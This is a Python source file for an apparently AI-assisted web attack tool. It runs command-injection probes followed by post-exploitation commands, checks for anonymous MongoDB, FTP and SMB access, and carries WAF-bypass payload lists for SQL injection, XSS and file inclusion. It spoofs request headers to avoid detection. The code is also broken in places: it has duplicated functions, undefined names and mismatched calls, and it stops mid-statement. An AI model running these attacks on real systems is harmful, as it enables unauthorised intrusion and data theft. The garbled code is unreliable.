import os
import asyncio
import subprocess
import configparser
import google.genai as genai
import anthropic
import time
from datetime import datetime
import threading
import queue
import socket # Added for HTTP Smuggling module
import requests # Added for SQLi module
import pymongo # Added for MongoDB module
import re # Added for SQLi module
import json # Added for SQLi module
from bs4 import BeautifulSoup # Added for React2Shell module
from urllib.parse import quote_plus, urlparse, urljoin, unquote # Added urlparse, urljoin, unquote
import tempfile
import random # Added for get_random_string
import string # Added for get_random_string

# Helper function to generate random strings
def get_random_string(length):
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for i in range(length))

# Helper function to normalize target URL
def normalize_target(target):
    if not target.startswith(('http://', 'https://')):
        return f"http://{target}"
    return target

# Helper function to extract domain from target URL
def get_domain(target):
    parsed_url = urlparse(target)
    return parsed_url.netloc.split(':')[0]



# Placeholder for AI decision making and dynamic payload generation
# These functions will be expanded later as per the user's request.
# Placeholder for detailed reporting
class Report:
    def __init__(self):
        self.findings = []

    def add_finding(self, finding):
        self.findings.append(finding)

    def generate_poc_code(self, finding):
        """Generates Python requests-based PoC code for a given finding."""
        if finding.get("poc_code"):
            return finding["poc_code"]
        return "# PoC code generation not implemented for this finding type yet."

# Placeholder for output
class Output:
    def print(self, message):
        print(message) # Using print for now, can be adapted to log_message if needed

    def generate_report(self, filename="penetration_test_report.md"):
        print(f"[+] Generating report: {filename}")
        report_content = "# Penetration Test Report\n\n"
        for finding in self.findings:
            report_content += f"## {finding.get('type', 'Unknown Vulnerability')}\n"
            report_content += f"- **Severity:** {finding.get('severity', 'N/A')}\n"
            report_content += f"- **Parameter:** {finding.get('parameter', 'N/A')}\n"
            report_content += f"- **Payload:** `{finding.get('payload', 'N/A')}`\n"
            if finding.get("db_type"):
                report_content += f"- **Database Type:** {finding['db_type']}\n"
            if finding.get("extracted_data"):
                report_content += f"- **Extracted Data:** {json.dumps(finding['extracted_data'], indent=2)}\n"
            if finding.get("response_snippet"):
                report_content += f"- **Response Snippet:**\n```\n{finding['response_snippet']}\n```\n"
            if finding.get("poc_code"):
                report_content += f"- **PoC Code:**\n```python\n{self.generate_poc_code(finding)}\n```\n\n"
            if finding.get("action_type"): # For attack logs
                report_content += f"- **AI Model:** {finding.get('ai_model', 'N/A')}\n"
                report_content += f"- **Action Type:** {finding.get('action_type', 'N/A')}\n"
                report_content += f"- **Action Details:** `{finding.get('action_details', 'N/A')}`\n"
                report_content += f"- **Output:**\n```\n{finding.get('output', 'N/A')}\n```\n"
                report_content += f"- **Timestamp:** {finding.get('timestamp', 'N/A')}\n"
        
        with open(filename, "w") as f:
            f.write(report_content)
        print(f"[+] Report saved to {filename}")

    def add_attack_log(self, step_number, ai_name, action_type, action_details, output):
        self.findings.append({
            "type": "Attack Log",
            "step": step_number,
            "ai_model": ai_name,
            "action_type": action_type, # "shell_command" or "internal_function_call"
            "action_details": action_details, # The command string or function call string
            "output": output, # The output from the command or function
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })


async def perform_exposed_services_attack(target, output, tech, report, session_cookies=None, nmap_output_file=None):
    """
    Parses an Nmap output file and runs specific checks on discovered open services.
    This function is now fully asynchronous.
    """
    output.print(f"\n[+] Starting Exposed Services Scan based on Nmap results for {target}...")

    if not nmap_output_file or not os.path.exists(nmap_output_file):
        output.print(f"  [WARNING] Nmap output file not found at '{nmap_output_file}'. Cannot perform exposed services scan.")
        report.add_finding({
            "type": "Exposed Services Scan",
            "severity": "Info",
            "url": target,
            "param": "N/A",
            "payload": "N/A",
            "description": "Skipped (Nmap file not found)",
            "recommendation": "Ensure Nmap scan is performed and output file is provided.",
            "response_snippet": "N/A"
        })
        return

    try:
        with open(nmap_output_file, 'r') as f:
            nmap_content = f.read()

        service_pattern = re.compile(r"(\d+)/(tcp|udp)\s+open\s+(\S+)")
        services_to_attack = []
        for line in nmap_content.splitlines():
            match = service_pattern.search(line)
            if match:
                port = int(match.group(1))
                protocol = match.group(2)
                service = match.group(3).lower()
                services_to_attack.append({'port': port, 'protocol': protocol, 'service': service})

        if not services_to_attack:
            output.print("  [INFO] No relevant open services found in Nmap output for exposed services scan.")
            report.add_finding({
                "type": "Exposed Services Scan",
                "severity": "Info",
                "url": target,
                "param": "N/A",
                "payload": "N/A",
                "description": "Completed (No open services)",
                "recommendation": "N/A",
                "response_snippet": "N/A"
            })
            return

        output_dir = os.path.dirname(nmap_output_file)
        tasks = []

        for service_info in services_to_attack:
            port = service_info['port']
            service_name = service_info['service']
            
            if 'ftp' in service_name:
                tasks.append(_ftp_anonymous_login(target, port, output_dir, report, output))
            elif 'netbios-ssn' in service_name or 'microsoft-ds' in service_name:
                tasks.append(_smb_anonymous_share(target, port, output_dir, report, output))
            # Add other async service checks here as needed, e.g., for SSH, Telnet, SMTP.
            # For now, focusing on fixing the existing logic for FTP and SMB.

        if tasks:
            await asyncio.gather(*tasks)

    except Exception as e:
        output.print(f"  [ERROR] An error occurred during exposed services scan: {e}")
        report.add_finding({
            "type": "Exposed Services Scan",
            "severity": "Error",
            "url": target,
            "param": "N/A",
            "payload": "N/A",
            "description": f"Error: {e}",
            "recommendation": "Review error logs and Nmap output.",
            "response_snippet": str(e)
        })

    output.print(f"[+] Exposed Services Scan for {target} Finished.")

async def _send_http_request(url, method='GET', data=None, headers=None, cookies=None, timeout=10, verify_ssl=True, allow_redirects=True, output=None, session_cookies=None):
    """
    Synchronous HTTP request function using requests library.
    Mimics the async _send_async_http_request from rap0at.py for compatibility.
    """
    req_headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'X-Forwarded-For': f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        'Via': '1.1 google'
    }
    if headers:
        req_headers.update(headers)
    
    req_cookies = cookies if cookies else {}
    if session_cookies:
        req_cookies.update(session_cookies)

    request_details = {
        'url': url,
        'method': method,
        'headers': req_headers,
        'data': data
    }
    response_details = {
        'status_code': None,
        'headers': {},
        'text': None,
        'error': None
    }

    try:
        if method.upper() == 'GET':
            res = requests.get(url, headers=req_headers, cookies=req_cookies, timeout=timeout, verify=verify_ssl, allow_redirects=allow_redirects)
        elif method.upper() == 'POST':
            res = requests.post(url, data=data, headers=req_headers, cookies=req_cookies, timeout=timeout, verify=verify_ssl, allow_redirects=allow_redirects)
        else:
            res = requests.request(method, url, data=data, headers=req_headers, cookies=req_cookies, timeout=timeout, verify=verify_ssl, allow_redirects=allow_redirects)
        
        response_details['status_code'] = res.status_code
        response_details['headers'] = dict(res.headers)
        response_details['text'] = res.text
        return res, request_details, response_details
    except requests.exceptions.Timeout:
        error_msg = f"Request to {url} timed out."
        if output: output.print(f"    [ERROR] {error_msg}")
        response_details['error'] = error_msg
    except requests.exceptions.ConnectionError as e:
        error_msg = f"Connection error to {url}: {e}"
        if output: output.print(f"    [ERROR] {error_msg}")
        response_details['error'] = error_msg
    except requests.exceptions.RequestException as e:
        error_msg = f"Unexpected requests error for {url}: {e}"
        if output: output.print(f"    [ERROR] {error_msg}")
        response_details['error'] = error_msg
    except Exception as e:
        error_msg = f"An unexpected error occurred during HTTP request to {url}: {e}"
        if output: output.print(f"    [ERROR] {error_msg}")
        response_details['error'] = error_msg
    return None, request_details, response_details

def get_encoded_payloads(payload):
    """다양한 인코딩으로 페이로드 목록 생성"""
    encoded_payloads = {payload}
    try:
        encoded_payloads.add(quote(payload))
        encoded_payloads.add(quote(quote(payload)))
        encoded_payloads.add(base64.b64encode(payload.encode()).decode().strip())
        encoded_payloads.add(html.escape(payload))
    except Exception:
        pass
    return list(encoded_payloads)

def build_request(base_url, method, param_name, payload, original_form_data=None, original_url_query=None, use_hpp=False):
    """향상된 요청 빌더 (HPP 지원)"""
    method = method.lower()
    
    # HPP 페이로드 구성
    if use_hpp:
        # HPP를 위해 페이로드와 랜덤 문자열을 동일 파라미터로 전달
        hpp_payload = f"{payload}&{param_name}={get_random_string(5)}"
    else:
        hpp_payload = payload

    if method == 'get':
        parsed_url = urlparse(base_url)
        # 기존 쿼리를 유지하면서 대상 파라미터를 수정하거나 추가
        query_params = []
        param_found = False
        if original_url_query:
            # URL 디코딩된 쿼리 문자열을 파싱
            params = unquote(original_url_query).split('&')
            for p_str in params:
                if '=' not in p_str:
                    query_params.append(p_str)
                    continue
                
                key, val = p_str.split('=', 1)
                if key == param_name:
                    # HPP 페이로드를 적용하고 인코딩
                    query_params.append(f"{key}={quote(hpp_payload)}")
                    param_found = True
                else:
                    query_params.append(f"{key}={quote(val)}")
        
        if not param_found:
            query_params.append(f"{param_name}={quote(hpp_payload)}")

        test_url = parsed_url._replace(query="&".join(query_params)).geturl()
        return test_url, None
    
    else: # POST, PUT, etc.
        post_data = original_form_data.copy() if original_form_data else {}
        
        if use_hpp and param_name in post_data:
            # HPP의 경우, 기존 값과 새 페이로드를 리스트로 만들어 전달 (일부 프레임워크에서 지원)
            # 또는 application/x-www-form-urlencoded 형식으로 직접 구성
            # 여기서는 간단하게 덮어쓰되, 실제 요청 라이브러리가 리스트를 지원하면 더 효과적
            # requests 라이브러리는 동일 키에 대해 여러 값을 보내려면 튜플 리스트를 사용해야 함
            # 여기서는 문자열 연결로 HPP를 시뮬레이션
            post_data[param_name] = hpp_payload 
        else:
            post_data[param_name] = payload
            
        return base_url, post_data

async def perform_cmdi_attack(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
    output.print(f"\n[+] Starting Hybrid Command Injection Scan...")
    marker = f"CMD{get_random_string(4)}"
    
    # Payloads for legacy full scan
    full_payloads = [
        f"| echo {marker}", f"; echo {marker}", f"&& echo {marker}", f"|| echo {marker}",
        f"| zgrep 'root' /var/log/auth.log.gz",
        f"| journalctl",
        f"| systemctl status",
        f"| docker ps",
        f"| kubectl get pods",
        f"| python -c 'import os; os.system(\"echo {marker}\")'",
        f"| perl -e 'system(\"echo {marker}\")'",
        f"| ruby -e 'system(\"echo {marker}\")'",
        f"| php -r 'system(\"echo {marker}\");'",
        f"| node -e 'require(\"child_process\").execSync(\"echo {marker}\")'",
        f"| lua -e 'os.execute(\"echo {marker}\")'",
        f"| go run -exec 'echo {marker}'",
        f"| rustc - -o /tmp/a && /tmp/a",
        f"| gcc -o /tmp/a -xc - && /tmp/a",
        f"| tclsh <<< 'exec echo {marker}'",
        f"| groovy -e '\"echo {marker}\".execute()'"
    ]
    
    async def run_post_exploitation(point, vuln_payload, initial_evidence_res):
        output.print(f"    [+] Command Injection Confirmed! Starting Post-Exploitation on param '{point['param']}'...")
        evidence = f"Initial detection response with marker '{marker}':\n---\n{(initial_evidence_res.text)[:300]}\n---\n\n"
        
        poc_commands = {
            "unix": ["whoami", "id", "uname -a", "pwd", "ls -la"],
            "windows": ["whoami", "ver", "ipconfig", "dir"]
        }
        detected_os = "windows" if "windows" in tech.get('os', '').lower() else "unix"
        
        evidence += f"Attempting PoC commands for {detected_os} OS...\n"
        
        for cmd in poc_commands[detected_os]:
            # Replace the original echo command with the new PoC command
            cmd_payload = vuln_payload.replace(f"echo {marker}", cmd)
            exploit_url, exploit_data = build_request(point['url'], point['method'], point['param'], point['value'] + cmd_payload, point['form_data'], point['original_query'])
            res_exploit, req_details, resp_details = await _send_http_request(exploit_url, method=point['method'], data=exploit_data, output=output, session_cookies=session_cookies)
            
            if res_exploit and (res_exploit.text):
                soup = BeautifulSoup(res_exploit.text, "html.parser")
                clean_output = soup.get_text(separator="\n").strip().replace(marker, "")
                if len(clean_output) > 0 and cmd not in clean_output and "not found" not in clean_output.lower() and "<!DOCTYPE" not in clean_output:
                    output.print(f"      [SUCCESS] Executed '{cmd}': {clean_output.splitlines()[0]}")
                    evidence += f"\n---[ Output of '{cmd}' ]---\n{clean_output}\n"
        
        report.add_finding("Command Injection (RCE)", "Critical", point['url'], point['param'], vuln_payload, 
                           "The application is vulnerable to OS Command Injection, allowing an attacker to execute arbitrary commands on the server.", 
                           "Use safe APIs that do not invoke shell commands. Implement strict, allow-list based input validation.", 
                           evidence, future_vector="A webshell can be uploaded for persistent access, or a reverse shell can be established.", method=point['method'])

    async def run_smart_probe(point):
        output.print(f"  [Phase 1] Running Smart Probe for Command Injection on param '{point['param']}'...")
        
        # 1. Reflection-based probe
        probe_payload = f"; echo {marker}"
        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
        res, _, _ = await _send_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
        if res and (res.text) and marker in res.text:
            await run_post_exploitation(point, probe_payload, res)
            return True

        # 2. Time-based probe
        time_probe_payload = "; sleep 10" # Unix-specific, but common
        start_time = time.time()
        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + time_probe_payload, point['form_data'], point['original_query'])
        await _send_http_request(test_url, method=point['method'], data=test_data, timeout=12, output=output, session_cookies=session_cookies)
        duration = time.time() - start_time
        if duration > 9.5 and duration < 11.5:
            output.print(f"    [CRITICAL] Time-Based Blind Command Injection confirmed with probe: '{time_probe_payload}'")
            evidence = f"Response time was {duration:.2f} seconds, indicating successful execution of a time-delay payload (e.g., sleep 10)."
            report.add_finding("Blind Command Injection (Time-Based)", "Critical", point['url'], point['param'], time_probe_payload, "The application is vulnerable to time-based blind OS command injection.", "Use safe APIs that do not invoke shell commands.", evidence, method=point['method'])
            return True
            
        return False

    async def run_ai_bypass(point):
        output.print(f"  [Phase 2] Running AI-Assisted Bypass for Command Injection on param '{point['param']}'...")
        probe_payload = f"| echo {marker}"
        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
        res, _, _ = await _send_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
        response_snippet = (res.text)[:500] if res and (res.text) else "No response from server."

        ai_payloads = await ai_generate_dynamic_payloads("Command Injection", probe_payload, response_snippet, output)
        for p in ai_payloads:
            test_url_ai, test_data_ai = build_request(point['url'], point['method'], point['param'], point['value'] + p, point['form_data'], point['original_query'])
            res_ai, _, _ = await _send_http_request(test_url_ai, method=point['method'], data=test_data_ai, output=output, session_cookies=session_cookies)
            if res_ai and (res_ai.text) and marker in res_ai.text:
                output.print(f"    [CRITICAL] AI-Generated Command Injection confirmed with payload: {p}")
                await run_post_exploitation(point, p, res_ai)
                return True
        return False

    async def run_full_scan(point):
        output.print(f"  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for Command Injection on param '{point['param']}'...")
        for p in full_payloads:
            if f"echo {marker}" not in p: continue
            for encoded_p in get_encoded_payloads(p):
                test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + encoded_p, point['form_data'], point['original_query'])
                res, _, _ = await _send_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
                if res and (res.text) and marker in res.text:
                    await run_post_exploitation(point, encoded_p, res)
                    return True
        return False

    # --- Main Orchestration Logic ---
    attack_points = []
    parsed_target = urlparse(target)
    base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
    identified_params = set()

    if parsed_target.query:
        params = unquote(parsed_target.query).split('&')
        for p_str in params:
            if '=' not in p_str: continue
            param_name, value = p_str.split('=', 1)
            attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
            identified_params.add(param_name)

    if form_to_test:
        action_url = urljoin(target, form_to_test['action'])
        form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
        for input_field in form_to_test['inputs']:
            if input_field['type'] in ['submit', 'hidden']: continue
            param_name = input_field['name']
            original_value = input_field.get('value', 'test')
            attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': param_name, 'value': original_value, 'form_data': form_data, 'original_query': None})
            identified_params.add(param_name)

    if not (parsed_target.query or form_to_test):
        cmd_params = [p for p in COMMON_PARAM_NAMES if any(k in p for k in ['exec', 'cmd', 'run', 'ping', 'query', 'call', 'do', 'test', 'file', 'load', 'read'])]
        for param_name in cmd_params[:50]: # Limit active guessing
            if param_name not in identified_params:
                attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': 'test', 'form_data': None, 'original_query': None})

    for point in attack_points:
        output.print(f"  [*] Testing Command Injection on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
        vulnerability_found = await run_smart_probe(point)
        if vulnerability_found:
            continue

        if ai_enabled:
            vulnerability_found = await run_ai_bypass(point)
            if vulnerability_found:
                continue
        
        vulnerability_found = await run_full_scan(point)
        if vulnerability_found:
            continue
            
        report.add_check(f"Command Injection on param '{point['param']}' at {point['url']}", "No vulnerability found")

    output.print("  [INFO] Command Injection scan completed.")

async def perform_mongodb_attack(target, output, tech, report, session_cookies=None):
    output.print("\n[+] Starting MongoDB Scan & Exploit...")
    domain = get_domain(normalize_target(target))
    port = 27017
    output.print(f"  [*] Attempting to connect to MongoDB on {domain}:{port}...")
    
    loop = asyncio.get_event_loop()
    try:
        # pymongo.MongoClient is synchronous, so run it in a separate thread
        client = await loop.run_in_executor(None, lambda: pymongo.MongoClient(domain, port, serverSelectionTimeoutMS=5000))
        await loop.run_in_executor(None, client.server_info) # Triggers connection
        output.print(f"  [HIGH] Anonymous connection to MongoDB at {domain}:{port} successful!")
        db_list = await loop.run_in_executor(None, client.list_database_names)
        evidence = f"Successfully connected to MongoDB at {domain}:{port} without authentication.\n"
        evidence += f"Available databases: {db_list}"
        output.print(f"    [SUCCESS] Found databases: {db_list}")
        report.add_finding({
            "type": "MongoDB Anonymous Access",
            "severity": "High",
            "url": f"{domain}:{port}",
            "param": "N/A",
            "payload": "N/A",
            "description": "The MongoDB server allows anonymous connections, potentially exposing all database contents.",
            "recommendation": "Enforce authentication on the MongoDB server. Bind to localhost if remote access is not required.",
            "response_snippet": evidence
        })
        await loop.run_in_executor(None, client.close)
    except pymongo.errors.ServerSelectionTimeoutError:
        output.print("  [INFO] MongoDB connection timed out. Server is likely not running or firewalled.")
        report.add_finding({
            "type": "MongoDB Scan",
            "severity": "Info",
            "url": f"{domain}:{port}",
            "param": "N/A",
            "payload": "N/A",
            "description": "MongoDB connection timed out. Server is likely not running or firewalled.",
            "recommendation": "Verify MongoDB service status and firewall rules.",
            "response_snippet": "Connection timed out."
        })
    except pymongo.errors.ConnectionFailure as e:
        output.print(f"  [INFO] MongoDB connection failed: {e}. Authentication may be required.")
        report.add_finding({
            "type": "MongoDB Scan",
            "severity": "Info",
            "url": f"{domain}:{port}",
            "param": "N/A",
            "payload": "N/A",
            "description": f"MongoDB connection failed: {e}. Authentication may be required.",
            "recommendation": "Attempt authentication with known credentials or brute-force.",
            "response_snippet": str(e)
        })
    except Exception as e:
        output.print(f"  [ERROR] An unexpected error occurred during MongoDB scan: {e}")
        report.add_finding({
            "type": "MongoDB Scan",
            "severity": "Error",
            "url": f"{domain}:{port}",
            "param": "N/A",
            "payload": "N/A",
            "description": f"An unexpected error occurred during MongoDB scan: {e}",
            "recommendation": "Review error logs.",
            "response_snippet": str(e)
        })
    


async def _ftp_anonymous_login(target, port, output_dir, report, output):
    """Async helper to check for anonymous FTP login."""
    output.print(f"    [*] Attempting anonymous FTP login on {target}:{port}")
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        writer.write(b"USER anonymous\r\n")
        await writer.drain()
        await reader.read(1024)
        writer.write(b"PASS anonymous\r\n")
        await writer.drain()
        res_pass = await reader.read(1024)
        if b"230" in res_pass:
            output.print(f"      [HIGH] Anonymous FTP login successful on {target}:{port}.")
            report.add_finding({
                "type": "Anonymous FTP Access",
                "severity": "High",
                "url": f"{target}:{port}",
                "param": "FTP Login",
                "payload": "anonymous:anonymous",
                "description": "Anonymous FTP access is enabled, potentially exposing files.",
                "recommendation": "Disable anonymous FTP access if not required.",
                "response_snippet": f"Response: {res_pass.decode(errors='ignore')}"
            })
        writer.close()
        await writer.wait_closed()
    except Exception as e:
        output.print(f"      [ERROR] FTP check on {target}:{port} failed: {e}")

async def _smb_anonymous_share(target, port, output_dir, report, output):
    """Async helper to check for anonymous SMB shares."""
    output.print(f"    [*] Checking for anonymous SMB shares on {target}:{port}")
    try:
        proc = await asyncio.create_subprocess_exec('smbclient', '-L', f'//{target}', '-N', '-p', str(port), stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
        smb_output = stdout.decode(errors='ignore')
        if proc.returncode == 0 and "Disk" in smb_output:
            output.print(f"      [HIGH] Anonymous SMB share listing successful on {target}:{port}.")
            report.add_finding({
                "type": "Anonymous SMB Share Listing",
                "severity": "High",
                "url": f"{target}:{port}",
                "param": "SMB",
                "payload": "Anonymous",
                "description": "SMB server allows anonymous listing of shares.",
                "recommendation": "Disable anonymous access to SMB shares.",
                "response_snippet": f"smbclient output:\n{smb_output}"
            })
    except FileNotFoundError:
        output.print("      [WARNING] `smbclient` not found. Skipping SMB check.")
    except Exception as e:
        output.print(f"      [ERROR] SMB check on {target}:{port} failed: {e}")

async def perform_exposed_services_attack(target, output, tech, report, session_cookies=None, nmap_output_file=None):
    """
    Parses an Nmap output file and runs specific checks on discovered open services.
    This function is now fully asynchronous.
    """
    output.print(f"\n[+] Starting Exposed Services Scan based on Nmap results for {target}...")

    if not nmap_output_file or not os.path.exists(nmap_output_file):
        output.print(f"  [WARNING] Nmap output file not found at '{nmap_output_file}'. Cannot perform exposed services scan.")
        report.add_finding({
            "type": "Exposed Services Scan",
            "severity": "Info",
            "url": target,
            "param": "N/A",
            "payload": "N/A",
            "description": "Skipped (Nmap file not found)",
            "recommendation": "Ensure Nmap scan is performed and output file is provided.",
            "response_snippet": "N/A"
        })
        return

    try:
        with open(nmap_output_file, 'r') as f:
            nmap_content = f.read()

        service_pattern = re.compile(r"(\d+)/(tcp|udp)\s+open\s+(\S+)")
        services_to_attack = []
        for line in nmap_content.splitlines():
            match = service_pattern.search(line)
            if match:
                port = int(match.group(1))
                protocol = match.group(2)
                service = match.group(3).lower()
                services_to_attack.append({'port': port, 'protocol': protocol, 'service': service})

        if not services_to_attack:
            output.print("  [INFO] No relevant open services found in Nmap output for exposed services scan.")
            report.add_finding({
                "type": "Exposed Services Scan",
                "severity": "Info",
                "url": target,
                "param": "N/A",
                "payload": "N/A",
                "description": "Completed (No open services)",
                "recommendation": "N/A",
                "response_snippet": "N/A"
            })
            return

        output_dir = os.path.dirname(nmap_output_file)
        tasks = []

        for service_info in services_to_attack:
            port = service_info['port']
            service_name = service_info['service']
            
            if 'ftp' in service_name:
                tasks.append(_ftp_anonymous_login(target, port, output_dir, report, output))
            elif 'netbios-ssn' in service_name or 'microsoft-ds' in service_name:
                tasks.append(_smb_anonymous_share(target, port, output_dir, report, output))
            # Add other async service checks here as needed, e.g., for SSH, Telnet, SMTP.
            # For now, focusing on fixing the existing logic for FTP and SMB.

        if tasks:
            await asyncio.gather(*tasks)

    except Exception as e:
        output.print(f"  [ERROR] An error occurred during exposed services scan: {e}")
        report.add_finding({
            "type": "Exposed Services Scan",
            "severity": "Error",
            "url": target,
            "param": "N/A",
            "payload": "N/A",
            "description": f"Error: {e}",
            "recommendation": "Review error logs and Nmap output.",
            "response_snippet": str(e)
        })

    output.print(f"[+] Exposed Services Scan for {target} Finished.")


def ai_analyze_scan_results(scan_results):
    
    
    """
    AI analyzes scan results to determine the most effective attack modules and payloads.
    This function parses Nmap, Nikto, and Nuclei scan results to identify technologies,
    open ports, and potential vulnerabilities, then suggests prioritized attack modules.
    """
    print("[AI] Analyzing scan results...")
    prioritized_attacks = []
    detected_technologies = []
    open_ports = []
    potential_vulnerabilities = []
    cve_ids = [] # NEW: Initialize list for CVE IDs
    
    # NEW: Extract CVE IDs from Nuclei output
    nuclei_output = scan_results.get('nuclei_output', '') # Get nuclei_output from scan_results
    if nuclei_output: # Only process if nuclei_output is not empty
        found_cves = re.findall(r'CVE-\d{4}-\d{4,7}', nuclei_output)
        cve_ids.extend(list(set(found_cves))) # Add unique CVEs

    # --- Prioritize Attacks based on findings ---

    # High priority for direct vulnerability findings
    if "SQL Injection" in potential_vulnerabilities:
        prioritized_attacks.append("perform_sqli_attack")
    if "XSS" in potential_vulnerabilities:
        prioritized_attacks.append("perform_xss_attack")
    if "LFI/RFI" in potential_vulnerabilities:
        prioritized_attacks.append("perform_lfi_rfi_attack")
    if "SSRF" in potential_vulnerabilities:
        prioritized_attacks.append("perform_ssrf_attack")
    if "XXE" in potential_vulnerabilities:
        prioritized_attacks.append("perform_xxe_attack")
    if "SSTI" in potential_vulnerabilities:
        prioritized_attacks.append("perform_ssti_attack")
    if "Login Form" in potential_vulnerabilities:
        prioritized_attacks.append("perform_brute_force_login")
    if "Command Injection" in potential_vulnerabilities: # Added for CMDi
        prioritized_attacks.append("perform_cmdi_attack") # Added for CMDi

    # NEW: Prioritize IDOR if numeric IDs are found in URLs
    if any(re.search(r'[?&](id|user_id|item_id|file_id|page_id)=\d+', url) for url in scan_results.get('spider_urls', [])):
        prioritized_attacks.append("perform_idor_attack")

    # NEW: Prioritize HTTP Smuggling if a proxy/load balancer is likely
    if any(tech in detected_technologies for tech in ["Apache", "nginx", "IIS"]):
        prioritized_attacks.append("perform_http_smuggling_attack")

    # Add attacks based on detected technologies if no direct vulns found yet
    if not prioritized_attacks:
        if "PHP" in detected_technologies:
            prioritized_attacks.extend(["perform_lfi_rfi_attack", "perform_ssti_attack", "perform_cmdi_attack"]) # PHP often vulnerable to these
        if "MySQL" in detected_technologies or "PostgreSQL" in detected_technologies or "MSSQL" in detected_technologies or "Oracle" in detected_technologies:
            prioritized_attacks.append("perform_sqli_attack")
        if "Apache" in detected_technologies or "nginx" in detected_technologies or "IIS" in detected_technologies:
            prioritized_attacks.extend(["perform_xss_attack", "perform_ssrf_attack", "perform_cmdi_attack"]) # Web servers are common targets

    # Ensure unique attacks and a default if nothing specific is found
    prioritized_attacks = list(dict.fromkeys(prioritized_attacks)) # Remove duplicates while preserving order
    if not prioritized_attacks:
        prioritized_attacks.extend(["perform_sqli_attack", "perform_xss_attack", "perform_cmdi_attack"]) # Default to common web attacks

    print(f"[AI] Prioritized attacks: {prioritized_attacks}")
    # NEW: Return separated attack plans
    return {
        "generic_attacks": prioritized_attacks,
        "cve_attacks": cve_ids,
        "detected_technologies": detected_technologies,
        "open_ports": open_ports,
        "potential_vulnerabilities": potential_vulnerabilities
    }

def ai_generate_dynamic_payloads(server_response, vulnerability_type):
    """
    AI generates custom WAF bypass payloads based on server responses.
    This function analyzes server responses to identify WAFs or other security mechanisms
    and suggests modified payloads to bypass them.
    """
    print(f"[AI] Generating dynamic payloads for {vulnerability_type}...")
    dynamic_payloads = []

    # Common WAF/security indicators in response
    waf_indicators = [
        "Mod_Security", "mod_security", "WAF", "Web Application Firewall",
        "Cloudflare", "Sucuri", "Incapsula", "Akamai", "Barracuda",
        "blocked", "denied", "access forbidden", "request blocked"
    ]

    response_text = server_response.get('text', '').lower()
    response_headers = {k.lower(): v.lower() for k, v in server_response.get('headers', {}).items()}
    status_code = server_response.get('status_code')

    # Check for WAF indicators
    is_waf_present = any(indicator in response_text for indicator in waf_indicators) or \
                     any(indicator in str(response_headers) for indicator in waf_indicators) or \
                     "x-waf-info" in response_headers or "x-sucuri-id" in response_headers

    if is_waf_present:
        print("[AI] WAF/Security mechanism detected. Attempting bypass techniques.")
        if vulnerability_type == "SQL Injection":
            dynamic_payloads.extend([
                # Encoding variations
                "1%27%20OR%201%3d1%20--", # URL encoded
                "1%2527%2520OR%25201%253d1%2520--", # Double URL encoded
                "1' /**/OR/**/1=1/**/--", # Comment obfuscation
                "1' UNION SELECT /*!*/ 1,2,3 --", # MySQL specific comment
                "1' AND '1'='1' AND '1'='1", # Tautology
                "1' AND 1=1 AND 'a'='a", # Tautology with string
                "1' AND (SELECT 1 FROM (SELECT SLEEP(5))A) AND '1'='1", # Time-based with subquery
            ])
        elif vulnerability_type == "XSS":
            dynamic_payloads.extend([
                # Encoding variations
                "%3cscript%3ealert(1)%3c/script%3e", # URL encoded
                "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;", # HTML entity encoded
                "<img src=x onerror=&#x61;lert(1)>", # Hex encoded char
                
                # Tag/attribute obfuscation
                "<sCrIpT>alert(1)</sCrIpT>", # Case variation
                "<img/src=x/onerror=alert(1)>", # Slash obfuscation
                "<svg onload=alert(1)>", # Different tag
                
                # Event handler bypasses
                "<body onpageshow=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ])
        elif vulnerability_type == "LFI/RFI":
            dynamic_payloads.extend([
                "....//....//....//....//etc/passwd", # Double dot-slash
                "%252e%252e%252f%252e%252e%252fetc%252fpasswd", # Double URL encoded
                "php://filter/convert.base64-encode/resource=index.php", # PHP filter
                "file:///etc/passwd%00.jpg", # Null byte
            ])
        # Add more vulnerability types and bypass techniques

    # If no WAF, or specific bypasses for status codes/errors
    if status_code == 403: # Forbidden
        print("[AI] Received 403 Forbidden. Trying alternative methods.")
        if vulnerability_type == "SQL Injection":
            dynamic_payloads.extend([
                "1' OR 1=1 LIMIT 1 --", # Limit clause
                "1' AND '0'='0", # Different tautology
            ])
        # Add more status code specific bypasses

    if "error" in response_text or "exception" in response_text:
